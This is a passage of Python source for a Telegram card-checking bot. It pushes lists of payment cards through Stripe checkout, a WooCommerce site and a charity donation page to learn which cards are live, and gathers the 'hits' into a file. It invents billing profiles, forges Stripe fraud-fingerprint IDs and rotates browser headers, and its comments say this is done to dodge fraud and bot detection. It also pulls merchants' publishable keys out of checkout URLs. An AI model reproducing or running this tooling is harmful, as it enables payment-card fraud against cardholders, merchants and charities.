                '<i>💡 Single card → instant result | Multiple → mass check</i></b>',
                parse_mode='HTML')
            return

        proxy = get_proxy_dict(uid)
        log_command(message, query_type='gateway', gateway='dlx')

        # ── SINGLE CARD ───────────────────────────────────────────────────
        if len(cards) == 1:
            allowed, wait = check_rate_limit(uid, BL)
            if not allowed:
                bot.reply_to(message,
                    f'<b>⏱️ 𝗪𝗮𝗶𝘁 {wait}𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝗻𝗲𝘅𝘁 𝗰𝗵𝗲𝗰𝗸.</b>',
                    parse_mode='HTML')
                return
            card = cards[0]
            msg  = bot.reply_to(message,
                '<b>🔍 Checking via DLX Gate... ⏳\n'
                '🏦 Gate: AssociationsManagement WooCommerce</b>',
                parse_mode='HTML')
            bin_info, bank, country, country_code = get_bin_info(card[:6])
            t0      = time.time()
            result  = dlx_stripe_engine(card, proxy)
            elapsed = time.time() - t0
            log_card_check(uid, card, 'dlx', result, exec_time=elapsed)
            emoji, is_live, _ = _dlx_classify(result)
            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton(text='YADISTAN - 🍀', url='https://t.me/yadistan'))
            bot.edit_message_text(
                chat_id=message.chat.id, message_id=msg.message_id,
                parse_mode='HTML', reply_markup=kb,
                disable_web_page_preview=True,
                text=UI.fmt_single(
                    'dlx', card, emoji, result,
                    gate_name='DLX WooCommerce Auth',
                    bin_info=bin_info, bank=bank,
                    country=country, country_code=country_code,
                    elapsed=elapsed
                ))
            return

        # ── MASS MODE ─────────────────────────────────────────────────────
        total = len(cards)
        try:
            stopuser[f'{uid}']['status'] = 'start'
        except Exception:
            stopuser[f'{uid}'] = {'status': 'start'}
        stop_kb = types.InlineKeyboardMarkup()
        stop_kb.add(types.InlineKeyboardButton(text='🛑 𝗦𝘁𝗼𝗽', callback_data='stop'))
        msg = bot.reply_to(message,
            UI.fmt_mass_header('dlx', total, gate_name='DLX WooCommerce Auth'),
            reply_markup=stop_kb, parse_mode='HTML')
        live = 0; dead = 0; cvc_hit = 0; checked = 0
        results_lines = []
        lock = threading.Lock()

        def build_dlx_mass_msg(st='⏳'):
            return UI.fmt_mass_progress(
                'dlx', checked, total, live, dead,
                gate_name='DLX WooCommerce Auth',
                secondary=cvc_hit,
                secondary_emoji='🟡', secondary_label='CVC',
                results_lines=results_lines, status=st
            )

        def _dlx_check_one(cc):
            nonlocal live, dead, cvc_hit, checked
            if stopuser.get(f'{uid}', {}).get('status') == 'stop':
                return
            cc = cc.strip()
            t0 = time.time()
            result  = dlx_stripe_engine(cc, proxy)
            elapsed = time.time() - t0
            log_card_check(uid, cc, 'dlx_mass', result, exec_time=elapsed)
            emoji, is_live, is_cvc = _dlx_classify(result)
            with lock:
                checked += 1
                if is_live and not is_cvc: live += 1
                elif is_cvc:               cvc_hit += 1
                else:                      dead += 1
                results_lines.append(f'{emoji} <code>{cc}</code>\n   ↳ {result}')
            try:
                sk2 = types.InlineKeyboardMarkup()
                sk2.add(types.InlineKeyboardButton(text='🛑 𝗦𝘁𝗼𝗽', callback_data='stop'))
                bot.edit_message_text(
                    chat_id=message.chat.id, message_id=msg.message_id,
                    text=build_dlx_mass_msg(), reply_markup=sk2, parse_mode='HTML')
            except Exception:
                pass

        from concurrent.futures import ThreadPoolExecutor, as_completed
        with ThreadPoolExecutor(max_workers=3) as pool:
            futures = {pool.submit(_dlx_check_one, cc): cc for cc in cards}
            for fut in as_completed(futures):
                if stopuser.get(f'{uid}', {}).get('status') == 'stop':
                    pool.shutdown(wait=False); break
                try: fut.result()
                except Exception: pass

        stopped = stopuser.get(f'{uid}', {}).get('status') == 'stop'
        try:
            done_kb = types.InlineKeyboardMarkup()
            done_kb.add(types.InlineKeyboardButton(text='YADISTAN - 🍀', url='https://t.me/yadistan'))
            bot.edit_message_text(
                chat_id=message.chat.id, message_id=msg.message_id,
                text=build_dlx_mass_msg('🛑' if stopped else '✅'),
                reply_markup=done_kb, parse_mode='HTML',
                disable_web_page_preview=True)
        except Exception:
            pass

    threading.Thread(target=my_function).start()

# ================== Stripe Checkout Function ==================
def _parse_stripe_error(error):

    decline_code = error.get('decline_code', '')
    err_code = error.get('code', '')
    err_msg = error.get('message', 'Unknown')

    DECLINE_MAP = {
        'insufficient_funds': 'Insufficient Funds',
        'card_velocity_exceeded': 'Velocity Exceeded',
        'do_not_honor': 'Do Not Honor',
        'generic_decline': 'Generic Decline',
        'lost_card': 'Lost Card',
        'stolen_card': 'Stolen Card',
        'pickup_card': 'Pickup Card',
        'expired_card': 'Card Expired',
        'incorrect_cvc': 'Incorrect CVC',
        'incorrect_number': 'Incorrect Number',
        'invalid_account': 'Invalid Account',
        'fraudulent': 'Flagged as Fraud',
        'transaction_not_allowed': 'Transaction Not Allowed',
        'try_again_later': 'Try Again Later',
        'withdrawal_count_limit_exceeded': 'Withdrawal Limit',
        'not_permitted': 'Not Permitted',
        'restricted_card': 'Restricted Card',
        'security_violation': 'Security Violation',
        'service_not_allowed': 'Service Not Allowed',
        'stop_payment_order': 'Stop Payment',
        'testmode_decline': 'Test Card',
        'no_action_taken': 'No Action Taken',
        'revocation_of_authorization': 'Auth Revoked',
        'blocked': 'Blocked',
    }
    ERR_CODE_MAP = {
        'card_declined': 'Card Declined',
        'expired_card': 'Card Expired',
        'incorrect_cvc': 'Incorrect CVC',
        'invalid_cvc': 'Invalid CVC',
        'incorrect_number': 'Incorrect Number',
        'invalid_number': 'Invalid Number',
        'invalid_expiry_month': 'Invalid Expiry Month',
        'invalid_expiry_year': 'Invalid Expiry Year',
        'authentication_required': '3DS Required (Live Card)',
        'resource_missing': 'Session Expired / Link Used',
        'session_expired': 'Session Expired / Link Used',
        'payment_intent_incompatible_payment_method': 'Session Expired / Link Used',
    }

    if decline_code:
        if decline_code == 'insufficient_funds':
            return 'Insufficient Funds'
        if 'authentication' in decline_code or '3ds' in decline_code:
            return '3DS Required (Live Card)'
        friendly = DECLINE_MAP.get(decline_code)
        if friendly:
            return friendly
        return f"Declined - {decline_code.replace('_', ' ').title()}"

    if err_code:
        if 'authentication' in err_code or 'action_required' in err_code:
            return '3DS Required (Live Card)'
        friendly = ERR_CODE_MAP.get(err_code)
        if friendly:
            return friendly
        return f"Declined - {err_code.replace('_', ' ').title()}"

    ml = err_msg.lower()
    if 'insufficient' in ml:
        return 'Insufficient Funds'
    if 'authentication' in ml or '3d' in ml or 'requires_action' in ml:
        return '3DS Required (Live Card)'
    if 'expired' in ml:
        return 'Card Expired'
    if 'resource' in ml and 'missing' in ml:
        return 'Session Expired / Link Used'
    if 'no such' in ml or 'not found' in ml:
        return 'Session Expired / Link Used'
    return f"Declined - {err_msg[:70]}"


def stripe_checkout(checkout_url, ccx, proxy_dict=None, sk=None):
    parsed = _parse_card(ccx)
    if not parsed:
        return "𝗘𝗿𝗿𝗼𝗿: Invalid card format (need cc|mm|yy|cvv)"
    c, mm, yy, cvc = parsed

    fake = Faker()
    first_name = fake.first_name()
    last_name = fake.last_name()
    email = f"{first_name.lower()}{random.randint(1000, 9999)}@gmail.com"
    city = fake.city()
    state = fake.state_abbr()
    zip_code = fake.zipcode()
    address = fake.street_address()

    session = cloudscraper.create_scraper()
    if proxy_dict:
        session.proxies.update(proxy_dict)
    ua = generate_user_agent()

    headers = {
        'user-agent': ua,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
    }

    try:
        r1 = session.get(checkout_url, headers=headers, allow_redirects=True, timeout=20)
        final_url = r1.url
        page_text = r1.text

        import base64
        from urllib.parse import urlparse, urlunparse, parse_qs, urlencode

        cs_id = None
        pk_live = None

        # Extract session ID — prefer ppage_ (payment_pages API supports ppage_)
        for src in [final_url, page_text]:
            m = re.search(r'ppage_[A-Za-z0-9_]+', src)
            if m and m.group(0) != 'ppage_DEMO':
                cs_id = m.group(0)
                break
        if not cs_id:
            for src in [final_url, page_text]:
                m = re.search(r'cs_(?:live|test)_[A-Za-z0-9_]+', src)
                if m:
                    cs_id = m.group(0)
                    break

        if not cs_id:
            return "Failed to extract form data"

        # For cs_live_ sessions: decode hash (XOR-5 encoded) to get pk_live
        # Stripe checkout embeds apiKey (pk_live) in the URL hash, XOR-encrypted with key 5
        if cs_id.startswith('cs_'):
            raw_hash = checkout_url.split('#', 1)[1] if '#' in checkout_url else ''
            if not raw_hash:
                # Try from redirected URL
                raw_hash = final_url.split('#', 1)[1] if '#' in final_url else ''
            if raw_hash:
                try:
                    import urllib.parse as _up
                    hash_decoded = _up.unquote(raw_hash)
                    padded = hash_decoded + '=' * ((4 - len(hash_decoded) % 4) % 4)
                    raw_bytes = base64.b64decode(padded)
                    # Try XOR keys 1-15 to find the one that yields valid JSON with pk_live
                    for xor_key in range(1, 16):
                        xored = bytes([b ^ xor_key for b in raw_bytes])
                        try:
                            xored_str = xored.decode('utf-8')
                            if '"apiKey"' in xored_str or '"publishableKey"' in xored_str:
                                import json as _json
                                hash_data = _json.loads(xored_str)
                                pk_live = hash_data.get('apiKey') or hash_data.get('publishableKey')
                                if pk_live and pk_live.startswith('pk_live_'):
                                    break
                                else:
                                    pk_live = None
                        except Exception:
                            continue
                except Exception:
                    pass

        # Fallback: try extracting pk_live from page HTML (works for ppage_ and some older cs_ pages)
        if not pk_live:
            for pat in [
                r'"(?:apiKey|publishableKey|public_key)"\s*:\s*"(pk_live_[A-Za-z0-9]+)"',
                r"'(?:apiKey|publishableKey)'\s*:\s*'(pk_live_[A-Za-z0-9]+)'",
                r'(?:publishableKey|apiKey|stripeKey)[^:=]{0,20}[:=]\s*["\']?(pk_live_[A-Za-z0-9]{20,})',
                r'pk_live_[A-Za-z0-9]{20,}',
            ]:
                m = re.search(pat, page_text)
                if m:
                    pk_live = m.group(1) if m.lastindex and m.lastindex >= 1 else m.group(0)
                    break

        if not pk_live:
            return "Failed to extract form data"

        # Use actual page origin (custom domain or stripe.com)
        parsed_origin = urlparse(final_url)
        page_origin = f"{parsed_origin.scheme}://{parsed_origin.netloc}"
        page_referer = final_url.split('#')[0]

        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': page_origin,
            'referer': page_referer,
            'user-agent': ua,
        }

        pm_data = (
            f'type=card'
            f'&billing_details[name]={first_name}+{last_name}'
            f'&billing_details[email]={email}'
            f'&billing_details[address][line1]={address.replace(" ", "+")}'
            f'&billing_details[address][city]={city.replace(" ", "+")}'
            f'&billing_details[address][state]={state}'
            f'&billing_details[address][postal_code]={zip_code}'
            f'&billing_details[address][country]=US'
            f'&card[number]={c}'
            f'&card[cvc]={cvc}'
            f'&card[exp_month]={mm}'
            f'&card[exp_year]={yy}'
            f'&payment_user_agent=stripe.js%2F419d6f15%3B+stripe-js-v3%2F419d6f15%3B+checkout-mobile'
            f'&time_on_page={random.randint(30000, 120000)}'
            f'&key={pk_live}'
        )

        pm_resp = session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=pm_data, timeout=20)
        pm_json = pm_resp.json()

        if 'error' in pm_json:
            return _parse_stripe_error(pm_json['error'])

        pm_id = pm_json.get('id')
        if not pm_id:
            return "Declined - Could not tokenize card"

        # Branch: cs_live_ sessions → requires merchant SK key
        if cs_id.startswith('cs_'):
            if not sk:
                return "CS_NEEDS_SK"

            sk_headers = {
                'Authorization': f'Bearer {sk}',
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': ua,
            }

            # Step 1: Fetch checkout session with SK to get payment_intent ID
            cs_resp = session.get(
                f'https://api.stripe.com/v1/checkout/sessions/{cs_id}',
                headers=sk_headers, timeout=15
            )
            cs_data = cs_resp.json()
            if 'error' in cs_data:
                err = cs_data['error']
                err_code = err.get('code', '')
                err_msg  = err.get('message', '').lower()
                if err_code == 'resource_missing' or 'no such' in err_msg:
                    return "Session Expired / Link Used"
                if cs_resp.status_code in (401, 403) or 'invalid api key' in err_msg:
                    return "Invalid SK Key - Check /setsk"
                return _parse_stripe_error(err)

            pi_id = cs_data.get('payment_intent', '')
            if not pi_id:
                # Subscription / setup mode — no immediate PI
                return "CS_GATEWAY_ERROR"

            # Step 2: Fetch PI to get client_secret
            pi_resp = session.get(
                f'https://api.stripe.com/v1/payment_intents/{pi_id}',
                headers=sk_headers, timeout=15
            )
            pi_data = pi_resp.json()
            if 'error' in pi_data:
                return _parse_stripe_error(pi_data['error'])

            client_secret = pi_data.get('client_secret', '')
            if not client_secret:
                return "Failed to extract form data"

            # Determine confirm endpoint (payment vs setup intent)
            if pi_id.startswith('seti_'):
                confirm_ep = f'https://api.stripe.com/v1/setup_intents/{pi_id}/confirm'
            else:
                confirm_ep = f'https://api.stripe.com/v1/payment_intents/{pi_id}/confirm'

            # Use SK for server-side confirmation (more reliable for checkout sessions)
            confirm_headers = {**stripe_headers, 'Authorization': f'Bearer {sk}'}
            confirm_data = (
                f'payment_method={pm_id}'
                f'&use_stripe_sdk=true'
                f'&return_url={page_referer}'
            )
            confirm_resp = session.post(
                confirm_ep, headers=confirm_headers, data=confirm_data, timeout=20
            )
            confirm_json = confirm_resp.json()

        else:
            # ppage_ sessions: use payment_pages flow
            page_get_resp = session.get(
                f'https://api.stripe.com/v1/payment_pages/{cs_id}?key={pk_live}',
                headers=stripe_headers, timeout=15
            )
            page_get_json = page_get_resp.json()

            if 'error' in page_get_json:
                err = page_get_json['error']
                if err.get('code') == 'resource_missing' or 'no such' in err.get('message', '').lower():
                    return "Session Expired / Link Used"
                return _parse_stripe_error(err)

            confirm_data = (
                f'payment_method={pm_id}'
                f'&expected_payment_method_type=card'
                f'&use_stripe_sdk=true'
                f'&return_url={page_referer}'
                f'&key={pk_live}'
            )
            confirm_resp = session.post(
                f'https://api.stripe.com/v1/payment_pages/{cs_id}/confirm',
                headers=stripe_headers, data=confirm_data, timeout=20
            )
            confirm_json = confirm_resp.json()

        if 'error' in confirm_json:
            return _parse_stripe_error(confirm_json['error'])

        status = confirm_json.get('status', '')
        if status in ('succeeded', 'complete', 'paid'):
            amount = confirm_json.get('amount', confirm_json.get('amount_total', 0))
            currency = confirm_json.get('currency', 'usd').upper()
            if amount:
                return f"Charged {currency} {int(amount)/100:.2f}"
            return "Checkout Successful"
        elif status == 'requires_action' or confirm_json.get('next_action'):
            return "3DS Required (Live Card)"
        elif status == 'processing':
            return "Processing (Live)"
        elif status == 'requires_payment_method':
            pi_err = confirm_json.get('last_payment_error', {})
            if pi_err:
                return _parse_stripe_error(pi_err)
            return "Card Declined"
        else:
            if confirm_json.get('next_action'):
                return "3DS Required (Live Card)"
            return f"Declined - {status}" if status else "Card Declined"

    except requests.exceptions.Timeout:
        return "Error: Timeout"
    except Exception as e:
        return f"Error: {str(e)[:80]}"

# ================== /dr — DrGaM Gateway Command ==================
def _dr_get_amount(text):
    """Extract optional amount from command text. Default $1.00."""
    for part in (text or '').split():
        try:
            amt = float(part)
            if 1.0 <= amt <= 9999:
                return f"{amt:.2f}"
        except ValueError:
            pass
    return "1.00"

def _dr_classify(result):
    """Return (emoji, is_hit, is_live, is_insuf) for a drgam result string."""
    if any(x in result for x in ("Approved", "Charge !!", "Charged", "Successful")):
        return "✅", True, True, False
    if any(x in result for x in ("Insufficient", "3DS", "OTP", "Requires")):
        return "💰", True, False, True
    if "Error" in result or "failed" in result.lower():
        return "⚠️", False, False, False
    return "❌", False, False, False

def _dlx_classify(result):
    """Return (emoji, is_live, is_cvc) for a dlx_stripe_engine result."""
    r = result
    if any(x in r for x in ('Approved', 'Insufficient')):
        return '✅', True, False
    if 'CVC Matched' in r:
        return '🟡', True, True
    if 'Error' in r:
        return '⚠️', False, False
    return '❌', False, False


@bot.message_handler(commands=["dr", "drm"])
def drgam_command(message):
    def my_function():
        uid  = message.from_user.id
        cmd  = (message.text or '').split()[0].lstrip('/').split('@')[0].lower()
        json_data = _load_data()

        try:
            BL = json_data[str(uid)]['plan']
        except Exception:
            BL = '𝗙𝗥𝗘𝗘'

        if BL == '𝗙𝗥𝗘𝗘' and uid != admin:
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>", parse_mode='HTML')
            return

        # ── Determine cards list ──────────────────────────────────────────────
        cards = _get_cards_from_message(message)
        if not cards:
            bot.reply_to(message,
                "<b>𝗖𝗼𝗿𝗿𝗲𝗰𝘁 𝘂𝘀𝗮𝗴𝗲:\n"
                "/dr 4111111111111111|12|25|123\n"
                "/dr 4111111111111111|12|25|123 5\n"
                "/dr card1\ncard2\ncard3\n\n"
                "<i>💡 Single card → instant result | Multiple cards → mass check\n"
                "Amount optional (default $1) | reply to .txt file also works</i></b>",
                parse_mode='HTML')
            return

        amount = _dr_get_amount(message.text or '')
        proxy  = get_proxy_dict(uid)
        log_command(message, query_type='gateway', gateway='drgam')

        # ══════════════════════════════════════════════════════════════════════
        # SINGLE CARD MODE
        # ══════════════════════════════════════════════════════════════════════
        if len(cards) == 1:
            allowed, wait = check_rate_limit(uid, BL)
            if not allowed:
                bot.reply_to(message, f"<b>⏱️ 𝗪𝗮𝗶𝘁 {wait}𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝗻𝗲𝘅𝘁 𝗰𝗵𝗲𝗰𝗸.</b>", parse_mode='HTML')
                return

            card = cards[0]
            msg = bot.reply_to(message,
                f"<b>⏳ Checking via DrGaM gateway...\n"
                f"💳 Card: <code>{card}</code>\n"
                f"💵 Amount: ${amount}</b>",
                parse_mode='HTML')

            bin_info, bank, country, country_code = get_bin_info(card[:6])
            t0     = time.time()
            result = drgam_charge(card, proxy, amount=amount)
            elapsed = time.time() - t0
            log_card_check(uid, card, 'drgam', result, exec_time=elapsed)

            emoji, _, _, _ = _dr_classify(result)
            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton(text="YADISTAN - 🍀", url="https://t.me/yadistan"))

            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=msg.message_id,
                parse_mode='HTML',
                reply_markup=kb,
                disable_web_page_preview=True,
                text=UI.fmt_single(
                    "dr", card, emoji, result,
                    gate_name="CrisisAid GiveWP + Stripe",
                    bin_info=bin_info, bank=bank,
                    country=country, country_code=country_code,
                    elapsed=elapsed, amount=amount
                )
            )
            return

        # ══════════════════════════════════════════════════════════════════════
        # MASS / BATCH MODE  (concurrent — up to 5 workers)
        # ══════════════════════════════════════════════════════════════════════
        total = len(cards)
        try:
            stopuser[f'{uid}']['status'] = 'start'
        except Exception:
            stopuser[f'{uid}'] = {'status': 'start'}

        stop_kb = types.InlineKeyboardMarkup()
        stop_kb.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))

        msg = bot.reply_to(message,
            UI.fmt_mass_header("dr", total, gate_name="CrisisAid GiveWP + Stripe", amount=amount),
            reply_markup=stop_kb, parse_mode='HTML')

        live = 0; dead = 0; insufficient = 0; checked = 0
        results_lines = []; all_hits = []
        lock = threading.Lock()

        def build_mass_msg(status_text="⏳"):
            return UI.fmt_mass_progress(
                "dr", checked, total, live, dead,
                gate_name="CrisisAid GiveWP + Stripe",
                secondary=insufficient, secondary_emoji="💰", secondary_label="Insuf",
                results_lines=results_lines, status=status_text, amount=amount
            )

        def _check_one(cc):
            nonlocal live, dead, insufficient, checked
            if stopuser.get(f'{uid}', {}).get('status') == 'stop':
                return
            cc = cc.strip()
            t0     = time.time()
            result = drgam_charge(cc, proxy, amount=amount)
            elapsed = time.time() - t0
            log_card_check(uid, cc, 'drgam_mass', result, exec_time=elapsed)

            emoji, is_hit, is_live, is_insuf = _dr_classify(result)
            with lock:
                checked += 1
                if is_live:
                    live += 1; all_hits.append(cc)
                elif is_insuf:
                    insufficient += 1; all_hits.append(cc)
                else:
                    dead += 1
                results_lines.append(f"{emoji} <code>{cc}</code>\n   ↳ {result} [{elapsed:.1f}s]")
            try:
                sk = types.InlineKeyboardMarkup()
                sk.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=msg.message_id,
                    text=build_mass_msg(),
                    reply_markup=sk,
                    parse_mode='HTML')
            except Exception:
                pass

        from concurrent.futures import ThreadPoolExecutor, as_completed
        with ThreadPoolExecutor(max_workers=5) as pool:
            futures = {pool.submit(_check_one, cc): cc for cc in cards}
            for fut in as_completed(futures):
                if stopuser.get(f'{uid}', {}).get('status') == 'stop':
                    pool.shutdown(wait=False)
                    break
                try:
                    fut.result()
                except Exception:
                    pass

        stopped = stopuser.get(f'{uid}', {}).get('status') == 'stop'
        status_txt = "🛑 𝗦𝗧𝗢𝗣𝗣𝗘𝗗" if stopped else "✅ 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱!"
        try:
            done_kb = types.InlineKeyboardMarkup()
            done_kb.add(types.InlineKeyboardButton(text="YADISTAN - 🍀", url="https://t.me/yadistan"))
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=msg.message_id,
                text=build_mass_msg(status_txt),
                reply_markup=done_kb,
                parse_mode='HTML')
        except Exception:
            pass

        if all_hits:
            import io
            hits_text  = (f"⚡ #DrGaM_Mass ${amount} — 𝗛𝗶𝘁𝘀 [{len(all_hits)}]\n"
                          f"━━━━━━━━━━━━━━━━━\n")
            hits_text += "\n".join(all_hits)
            hits_text += f"\n━━━━━━━━━━━━━━━━━\n⌤ Dev by YADISTAN 🍀"
            bot.send_document(
                chat_id=message.chat.id,
                document=io.BytesIO(hits_text.encode('utf-8')),
                visible_file_name=f"drgam_hits_{len(all_hits)}.txt",
                caption=(f"<b>✅ DrGaM Hits — {len(all_hits)} cards\n"
                         f"💵 Gate: CrisisAid GiveWP ${amount}</b>"),
                parse_mode='HTML')

    threading.Thread(target=my_function).start()


# ================== Stripe Mass Command ==================

# ================== Stripe Checkout Hitter (Pure Python) ==================
# Updated Stripe.js fingerprint — matches current Stripe.js v3 build (2025)
_STRIPE_UA      = 'stripe.js/148043f9d7; stripe-js-v3/148043f9d7; payment-link; checkout'
_STRIPE_VERSION = '148043f9d7'
_XOR_KEY        = 5

# ─────────────────────────────────────────────────────────────────────────────
# US Billing Profile Pool  (Pixel extension: fetchUSAddressWithRetry)
# Real US addresses across different states — prevents address-velocity flags
# ─────────────────────────────────────────────────────────────────────────────
_US_PROFILES = [
    {"name": "James Carter",    "email": "james.carter84@gmail.com",    "line1": "2847 Maple Ave",       "city": "Austin",       "state": "TX", "zip": "78701"},
    {"name": "Sarah Mitchell",  "email": "s.mitchell92@yahoo.com",      "line1": "1120 Oak Street",      "city": "Phoenix",      "state": "AZ", "zip": "85001"},
    {"name": "Robert Hayes",    "email": "rob.hayes77@hotmail.com",     "line1": "4509 Pine Road",       "city": "Denver",       "state": "CO", "zip": "80201"},
    {"name": "Emily Johnson",   "email": "emily.j2001@gmail.com",       "line1": "7823 Cedar Lane",      "city": "Portland",     "state": "OR", "zip": "97201"},
    {"name": "Michael Torres",  "email": "m.torres55@outlook.com",      "line1": "3310 Birch Blvd",      "city": "Tampa",        "state": "FL", "zip": "33601"},
    {"name": "Jessica Brown",   "email": "jbrown.jess@gmail.com",       "line1": "9201 Elm Court",       "city": "Charlotte",    "state": "NC", "zip": "28201"},
    {"name": "David Wilson",    "email": "d.wilson.dw@yahoo.com",       "line1": "650 Walnut Drive",     "city": "Nashville",    "state": "TN", "zip": "37201"},
    {"name": "Ashley Davis",    "email": "ashley.d.1990@gmail.com",     "line1": "1834 Spruce Way",      "city": "Las Vegas",    "state": "NV", "zip": "89101"},
    {"name": "Christopher Lee", "email": "c.lee.chris@hotmail.com",     "line1": "405 Willow Street",    "city": "Atlanta",      "state": "GA", "zip": "30301"},
    {"name": "Amanda Clark",    "email": "amanda.clark09@gmail.com",    "line1": "2701 Hickory Rd",      "city": "Columbus",     "state": "OH", "zip": "43201"},
    {"name": "Daniel Martinez", "email": "d.martinez.dan@yahoo.com",    "line1": "1050 Poplar Ave",      "city": "Albuquerque",  "state": "NM", "zip": "87101"},
    {"name": "Lauren White",    "email": "lauren.white.lw@gmail.com",   "line1": "3620 Chestnut Blvd",  "city": "Louisville",   "state": "KY", "zip": "40201"},
    {"name": "Kevin Anderson",  "email": "kevin.a.2003@outlook.com",    "line1": "7140 Aspen Ct",        "city": "Omaha",        "state": "NE", "zip": "68101"},
    {"name": "Megan Thompson",  "email": "megan.t88@gmail.com",         "line1": "923 Dogwood Dr",       "city": "Richmond",     "state": "VA", "zip": "23218"},
    {"name": "Tyler Jackson",   "email": "tyler.jackson.tx@yahoo.com",  "line1": "5558 Magnolia Lane",   "city": "Baton Rouge",  "state": "LA", "zip": "70801"},
    {"name": "Nicole Harris",   "email": "n.harris.nh@gmail.com",       "line1": "2200 Redwood Ave",     "city": "Sacramento",   "state": "CA", "zip": "95814"},
    {"name": "Brandon Lewis",   "email": "brandon.lewis.bl@hotmail.com","line1": "880 Sycamore Street",  "city": "Kansas City",  "state": "MO", "zip": "64101"},
    {"name": "Stephanie Young", "email": "steph.young.sy@gmail.com",    "line1": "3390 Cottonwood Ct",   "city": "Salt Lake City","state": "UT","zip": "84101"},
    {"name": "Justin Hall",     "email": "justin.hall.jh@yahoo.com",    "line1": "6610 Cypress Blvd",   "city": "Tulsa",        "state": "OK", "zip": "74101"},
    {"name": "Rachel Scott",    "email": "rachel.scott.rs@gmail.com",   "line1": "1780 Juniper Way",     "city": "Raleigh",      "state": "NC", "zip": "27601"},
]

def _gen_us_profile():
    """Return a random US billing profile dict (Pixel-style address pool)."""
    return random.choice(_US_PROFILES).copy()

def _gen_stripe_ids():
    """
    Generate Stripe-style guid/muid/sid fingerprint IDs.
    Extension uses Math.random() to produce UUID4 + 8 extra hex chars.
    Sending 'NA' triggers Stripe fraud scoring — real IDs look legitimate.
    Format: xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx + 8hex suffix
    """
    import uuid
    def _sid():
        base = str(uuid.uuid4()).replace('-', '')
        extra = ''.join(random.choice('0123456789abcdef') for _ in range(8))
        return f"{base[:8]}-{base[8:12]}-4{base[13:16]}-{base[16:20]}-{base[20:32]}{extra}"
    return _sid(), _sid(), _sid()  # guid, muid, sid

# ─────────────────────────────────────────────────────────────────────────────
# Stripe Fingerprint Headers  (Pixel extension: buildFingerprintGeoContext)
# Mimics real Chrome browser making Stripe API requests — avoids bot flags
# ─────────────────────────────────────────────────────────────────────────────
# Updated Chrome UA pool — 2025/2026 versions (Chrome 130-133)
_CHROME_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
]

# State → US timezone map (makes browser_timezone realistic per billing profile)
_STATE_TZ = {
    'TX': 'America/Chicago',    'FL': 'America/New_York',   'CA': 'America/Los_Angeles',
    'NY': 'America/New_York',   'IL': 'America/Chicago',    'PA': 'America/New_York',
    'OH': 'America/New_York',   'GA': 'America/New_York',   'NC': 'America/New_York',
    'MI': 'America/Detroit',    'NJ': 'America/New_York',   'VA': 'America/New_York',
    'WA': 'America/Los_Angeles','AZ': 'America/Phoenix',    'MA': 'America/New_York',
    'TN': 'America/Chicago',    'IN': 'America/Indiana/Indianapolis',
    'MO': 'America/Chicago',    'MD': 'America/New_York',   'WI': 'America/Chicago',
    'CO': 'America/Denver',     'MN': 'America/Chicago',    'SC': 'America/New_York',
    'AL': 'America/Chicago',    'LA': 'America/Chicago',    'KY': 'America/New_York',
    'OR': 'America/Los_Angeles','OK': 'America/Chicago',    'CT': 'America/New_York',
    'UT': 'America/Denver',     'NV': 'America/Los_Angeles','AR': 'America/Chicago',
    'NM': 'America/Denver',     'NE': 'America/Chicago',    'ID': 'America/Denver',
    'KS': 'America/Chicago',    'MT': 'America/Denver',     'SD': 'America/Chicago',
    'RI': 'America/New_York',   'ME': 'America/New_York',   'NH': 'America/New_York',
}

def _stripe_fingerprint_headers(origin: str = 'https://checkout.stripe.com',
                                 state: str = None) -> dict:
    """
    Build browser-like headers for Stripe API calls.
    Updated: Chrome 130-133 UAs, state-aware timezone, current sec-ch-ua hints.
    """
    ua = random.choice(_CHROME_UAS)
    is_chrome = 'Chrome/' in ua
    is_firefox = 'Firefox/' in ua
    chrome_ver = '131'
    if is_chrome:
        import re as _re2
        _m = _re2.search(r'Chrome/(\d+)', ua)
